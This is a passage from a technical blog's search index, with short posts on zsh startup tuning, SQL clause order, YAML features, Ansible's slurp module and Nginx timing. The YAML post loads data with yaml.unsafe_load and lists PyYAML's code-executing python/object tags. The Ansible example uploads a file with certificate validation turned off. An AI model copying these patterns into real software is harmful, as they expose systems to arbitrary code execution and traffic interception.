sukka_lazyload_add_completion() { local comp_name=\u0026#34;_sukka_lazyload__compfunc_$1\u0026#34; eval \u0026#34;${comp_name}() { \\ compdef -d $1; \\ _sukka_lazyload_completion_$1; \\ }\u0026#34; compdef $comp_name $1 } _sukka_lazyload__command_pyenv() { # pyenv 初始化 eval \u0026#34;$(command pyenv init -)\u0026#34; } _sukka_lazyload__compfunc_pyenv() { # pyenv 命令补全 source \u0026#34;$(brew --prefix pyenv)/completions/pyenv.zsh\u0026#34; } # 添加 pyenv 的 lazyload sukka_lazyload_add_command pyenv sukka_lazyload_add_completion pyenv _sukka_lazyload__command_fuck() { # fuck 初始化 eval $(thefuck --alias) } # 添加 fuck 的 lazyload sukka_lazyload_add_command fuck _sukka_lazyload__completion_hexo() { # hexo 的 completion eval $(hexo --completion=zsh) } # 添加 hexo completion 的 lazyload sukka_lazyload_add_completion hexo zsh 判断命令是否存在 通常情况下我们会写出以下三种条件判断方式：\n[[ command -v node \u0026amp;\u0026gt;/dev/null ]] \u0026amp;\u0026amp; node -v [[ which -a node \u0026amp;\u0026gt;/dev/null ]] \u0026amp;\u0026amp; node -v [[ type node \u0026amp;\u0026gt;/dev/null ]] \u0026amp;\u0026amp; node -v 但是在 zsh 中，还有一种速度更快的判断命令存在的方法：\n(( $+commands[node] )) \u0026amp;\u0026amp; node -v zsh 提供了一个数组元素查找语法 $+array[item] （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 $commands，在数组中检索元素比调用 which、type、command -v 命令都要快许多。\n变量字符串查找 在 .zshrc 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 $FPATH 中重复添加 Homebrew 的自动补全，提前检查 $FPATH 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 echo 和 grep ：\n[[ $(echo $FPATH | grep \u0026#34;/usr/local/share/zsh/site-functions\u0026#34;) ]] \u0026amp;\u0026amp; echo \u0026#34;homebrew exists in fpath\u0026#34; 但是在 zsh 中我们不需要 grep 也可以实现同样的功能：\n(( $FPATH[(I)/usr/local/share/zsh/site-functions] )) \u0026amp;\u0026amp; echo \u0026#34;homebrew exists in fpath\u0026#34; zsh 内置了在变量中匹配字符串的语法：$variable[(i)keyword] 和 $variable[(I)keyword]，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 (i) 会返回字符串的长度、而 (I) 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 (( )) 就可以写出又快又漂亮的条件语句。\n","date":"July 15, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210715-make-oh-my-zsh-fly/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\" target=\"_blank\" rel=\"noopener\"\u003e我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"profiling\"\u003eProfiling\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# .zshrc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ezmodload zsh/zprof\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ /bin/zsh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ zprof\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enum  calls                time                       self            name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e-----------------------------------------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 1\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 2\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 3\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 5\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 6\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 7\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e 9\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e10\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e193\u003c/span\u003e          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eRedacted\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ezprof\u003c/code\u003e 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 \u003ccode\u003e.zshrc\u003c/code\u003e 性能分析，应该使用 \u003ccode\u003extrace\u003c/code\u003e。在 \u003ccode\u003e.zshrc\u003c/code\u003e 开头添加如下命令\u003c/p\u003e","tags":["URL","Zsh"],"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化"},{"categories":["URL","Ansible","Cisco"],"contents":" [網友好文]Cisco UCS CIMC 系列文章 Ansible - 設定 Cisco UCS CIMC 時區 Ansible - 設定 Cisco UCS CIMC DNS 和停用 IPv6 Ansible - 設定 Cisco UCS CIMC Fan Policy Ansible - 設定 Cisco UCS CIMC Mail Alert Ansible - 設定 Cisco UCS CIMC 40Gb vNIC 參數 Ansible - 設定 Cisco UCS CIMC NTP 時間校時 ","date":"July 15, 2021","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210715-cisco-ucs-cimc/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/cisco-ucs-cimc/\" target=\"_blank\" rel=\"noopener\"\u003e[網友好文]Cisco UCS CIMC 系列文章\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/06/ansible-for-cisco-ucs-cimc.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC 時區\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/06/ansible-for-cisco-ucs-cimc-dns-ipv6.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC DNS 和停用 IPv6\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/06/ansible-cisco-ucs-cimc-fan-policy.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC Fan Policy\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/06/ansible-cisco-ucs-cimc-mail-alert.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC Mail Alert\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/06/ansible-cisco-ucs-cimc-40gb-vnic.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC 40Gb vNIC 參數\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2021/07/ansible-cisco-ucs-cimc-ntp.html\" target=\"_blank\" rel=\"noopener\"\u003eAnsible - 設定 Cisco UCS CIMC NTP 時間校時\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Ansible","Cisco"],"title":"[網友好文]Cisco UCS CIMC系列文章"},{"categories":["URL","SQL"],"contents":" SQL queries don\u0026rsquo;t start with SELECT SQL queries happen in this order FROM/JOIN and all the ON conditions WHERE GROUP BY HAVING SELECT (including window functions) ORDER BY LIMIT ","date":"July 14, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210714-sql-queries-don-t-start-with-select/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jvns.ca/blog/2019/10/03/sql-queries-don-t-start-with-select/\" target=\"_blank\" rel=\"noopener\"\u003eSQL queries don\u0026rsquo;t start with SELECT\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"sql-queries-happen-in-this-order\"\u003eSQL queries happen in this order\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eFROM/JOIN\u003c/code\u003e and all the \u003ccode\u003eON\u003c/code\u003e conditions\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eWHERE\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eGROUP BY\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eHAVING\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eSELECT\u003c/code\u003e (including window functions)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eORDER BY\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLIMIT\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","SQL"],"title":"SQL queries don't start with SELECT"},{"categories":["URL","YAML"],"contents":" 6 YAML Features most programmers don\u0026rsquo;t know There are more examples that are similarly dangerous as Tom Ritchford pointed out 013 is mapped to 11 as the leading zero triggers the octal notation 4:30 is mapped to 270. Max Werner Kaul-Gothe and Niklas Baumstark informed me that this is automatically converted to minutes (or seconds?) as it is interpreted as a duration: 4*60 + 30 = 270 . Interestingly, this pattern still \u0026ldquo;works\u0026rdquo; with 1:1:1:1:1:1:1:1:4:30 . Multi-Line String mail_signature: | Martin Thoma Tel. +49 123 4567 { \u0026#34;mail_signature\u0026#34;: \u0026#34;Martin Thoma\\nTel. +49 123 4567\u0026#34; } Anchor The \u0026amp; defined a variable emailAddress with the value \u0026quot;info@example.de\u0026quot;. The * then indicated that the name of a variable follows.\nemail: \u0026amp;emailAddress \u0026#34;info@example.de\u0026#34; id: *emailAddress { \u0026#34;email\u0026#34;: \u0026#34;info@example.de\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;info@example.de\u0026#34; } You can do the same with mappings foo: \u0026amp;default_settings db: host: localhost name: main_db port: 1337 email: admin: admin@example.com prod: \u0026lt;\u0026lt;: *default_settings app: port: 80 dev: *default_settings { \u0026#34;foo\u0026#34;: { \u0026#34;db\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;localhost\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;main_db\u0026#34;, \u0026#34;port\u0026#34;: 1337 }, \u0026#34;email\u0026#34;: { \u0026#34;admin\u0026#34;: \u0026#34;admin@example.com\u0026#34; } }, \u0026#34;prod\u0026#34;: { \u0026#34;app\u0026#34;: { \u0026#34;port\u0026#34;: 80 }, \u0026#34;db\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;localhost\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;main_db\u0026#34;, \u0026#34;port\u0026#34;: 1337 }, \u0026#34;email\u0026#34;: { \u0026#34;admin\u0026#34;: \u0026#34;admin@example.com\u0026#34; } }, \u0026#34;dev\u0026#34;: { \u0026#34;db\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;localhost\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;main_db\u0026#34;, \u0026#34;port\u0026#34;: 1337 }, \u0026#34;email\u0026#34;: { \u0026#34;admin\u0026#34;: \u0026#34;admin@example.com\u0026#34; } } } Type Casting The double bang !! has a special meaning in YAML. It is called \u0026ldquo;secondary tag handle\u0026rdquo; and a shorthand for !tag:yaml.org,2002\ntuple_example: !!python/tuple - 1337 - 42 set_example: !!set { 1337, 42 } date_example: !!timestamp 2020-12-31 import yaml import pprint with open(\u0026#34;example.yaml\u0026#34;) as fp: data = fp.read() pp = pprint.PrettyPrinter(indent=4) pased = yaml.unsafe_load(data) pp.pprint(pased) { \u0026#39;date_example\u0026#39;: datetime.date(2020, 12, 31), \u0026#39;set_example\u0026#39;: {1337, 42}, \u0026#39;tuple_example\u0026#39;: (1337, 42)} PyYaml ## Standard YAML tags YAML Python 3 !!null None !!bool bool !!int int !!float float !!binary bytes !!timestamp datetime.datetime !!omap, !!pairs list of pairs !!set set !!str str !!seq list !!map dict ## Python-specific tags YAML Python 3 !!python/none None !!python/bool bool !!python/bytes bytes !!python/str str !!python/unicode str !!python/int int !!python/long int !!python/float float !!python/complex complex !!python/list list !!python/tuple tuple !!python/dict dict ## Complex Python tags !!python/name:module.name module.name !!python/module:package.module package.module !!python/object:module.cls module.cls instance !!python/object/new:module.cls module.cls instance !!python/object/apply:module.f value of f(...) ","date":"July 7, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210707-6-yaml-features-most-programmers-dont-know/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://levelup.gitconnected.com/6-yaml-features-most-programmers-dont-know-164762343af3\" target=\"_blank\" rel=\"noopener\"\u003e6 YAML Features most programmers don\u0026rsquo;t know\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"there-are-more-examples-that-are-similarly-dangerous-as-tom-ritchford-pointed-out\"\u003eThere are more examples that are similarly dangerous as Tom Ritchford pointed out\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e013\u003c/code\u003e is mapped to 11 as the leading zero triggers the octal notation\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e4:30\u003c/code\u003e is mapped to 270. Max Werner Kaul-Gothe and Niklas Baumstark informed me that this is automatically converted to minutes (or seconds?) as it is interpreted as a duration: \u003ccode\u003e4*60 + 30 = 270\u003c/code\u003e . Interestingly, this pattern still \u0026ldquo;works\u0026rdquo; with \u003ccode\u003e1:1:1:1:1:1:1:1:4:30\u003c/code\u003e .\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"multi-line-string\"\u003eMulti-Line String\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003email_signature\u003c/span\u003e: |\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  Martin Thoma\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  Tel. +49 123 4567\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{ \u003cspan style=\"color:#f92672\"\u003e\u0026#34;mail_signature\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Martin Thoma\\nTel. +49 123 4567\u0026#34;\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"anchor\"\u003eAnchor\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe \u003ccode\u003e\u0026amp;\u003c/code\u003e defined a variable \u003ccode\u003eemailAddress\u003c/code\u003e with the value \u003ccode\u003e\u0026quot;info@example.de\u0026quot;\u003c/code\u003e. The \u003ccode\u003e*\u003c/code\u003e then indicated that the name of a variable follows.\u003c/p\u003e","tags":["URL","YAML"],"title":"6 YAML Features most programmers don't know"},{"categories":["URL","Typora","Markdown","Mermaid","Diagrams"],"contents":" Draw Diagrams With Markdown ","date":"June 29, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210629-draw-diagrams-with-markdown/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://support.typora.io/Draw-Diagrams-With-Markdown/#sequence-diagrams\" target=\"_blank\" rel=\"noopener\"\u003eDraw Diagrams With Markdown\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Typora","Markdown","Mermaid","Diagrams"],"title":"Draw Diagrams With Markdown"},{"categories":["URL","Ansible"],"contents":" ansible.builtin.slurp - 讀取檔案內容 --- - name: Use HTTP POST to upload file hosts: all tasks: - name: Read binary file content slurp: path: \u0026#34;/bin/ls\u0026#34; register: bin_file - name: Send HTTP POST Request uri: url: \u0026#34;https://your_server/upload.php\u0026#34; headers: Accept: \u0026#34;application/json\u0026#34; Content-Type: \u0026#34;application/octet-stream\u0026#34; method: POST validate_certs: false body: \u0026#34;{{ bin_file.content }}\u0026#34; status_code: - 200 - 201 register: upload_result - name: Display upload_result debug: var: upload_result 使用 slurp，就可以避掉 lookup(\u0026lsquo;file\u0026rsquo;) 的限制。\n可以讀取受控端主機上的檔案，也可以利用 delegate_to: localhost 來讀取主控端主機上的檔案。 可以讀取二進位檔案來做進一步處理，例如做 base64 編碼 ","date":"May 31, 2021","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210531-slurp-read-file-content/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/slurp-read-file-content/\" target=\"_blank\" rel=\"noopener\"\u003eansible.builtin.slurp - 讀取檔案內容\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e---\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eUse HTTP POST to upload file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ehosts\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eRead binary file content\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eslurp\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003epath\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/bin/ls\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebin_file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eSend HTTP POST Request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003euri\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eurl\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://your_server/upload.php\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eheaders\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eAccept\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;application/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003eContent-Type\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;application/octet-stream\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003emethod\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ePOST\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evalidate_certs\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ebody\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ bin_file.content }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003estatus_code\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          - \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          - \u003cspan style=\"color:#ae81ff\"\u003e201\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003eregister\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eupload_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eDisplay upload_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003edebug\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003evar\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eupload_result\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用 slurp，就可以避掉 lookup(\u0026lsquo;file\u0026rsquo;) 的限制。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e可以讀取受控端主機上的檔案，也可以利用 delegate_to: localhost 來讀取主控端主機上的檔案。\u003c/li\u003e\n\u003cli\u003e可以讀取二進位檔案來做進一步處理，例如做 base64 編碼\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Ansible"],"title":"ansible.builtin.slurp - 讀取檔案內容"},{"categories":["URL","Nginx"],"contents":" Nginx - request_time 和 upstream_response_time 详解 time definition request_time\n从接受用户请求的第一个字节到发送完响应数据的时间，即$request_time 包括接收客户端请求数据的时间、后端程序响应的时间、发送响应数据给客户端的时间(不包含写日志的时间)。\nupstream_response_time\n从 Nginx 向后端建立连接开始到接受完数据然后关闭连接为止的时间\nupstream_connect_time\n跟后端 server 建立连接的时间，如果是到后端使用了加密的协议，该时间将包括握手的时间。\nupstream_header_time\n接收后端 server 响应头的时间\n如果把整个过程补充起来的话 应该是：\n［1用户请求］［2建立 Nginx 连接］［3发送响应］［4接收响应］［5关闭 Nginx 连接］\n那么 upstream_response_time 就是 2+3+4+5 但是 一般这里面可以认为 ［5关闭 Nginx 连接］ 的耗时接近 0 所以 upstream_response_time 实际上就是 2+3+4 而 request_time 是 1+2+3+4 二者之间相差的就是 ［1用户请求］的时间。 upstream_response_time 比 request_time 大 https://forum.nginx.org/read.php?21,284448,284450#msg-284450\n$upstream_response_time 由 clock_gettime(CLOCK_MONOTONIC_COARSE)计算，默认情况下，它可以过去 4 毫秒，相反，$request_time 由 gettimeofday()计算。 所以最终 upstream_response_time 可能比 response_time 更大。\n","date":"May 14, 2021","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2021/20210514-105819628/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.csdn.net/zzhongcy/article/details/105819628\" target=\"_blank\" rel=\"noopener\"\u003eNginx - request_time 和 upstream_response_time 详解\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"time-definition\"\u003etime 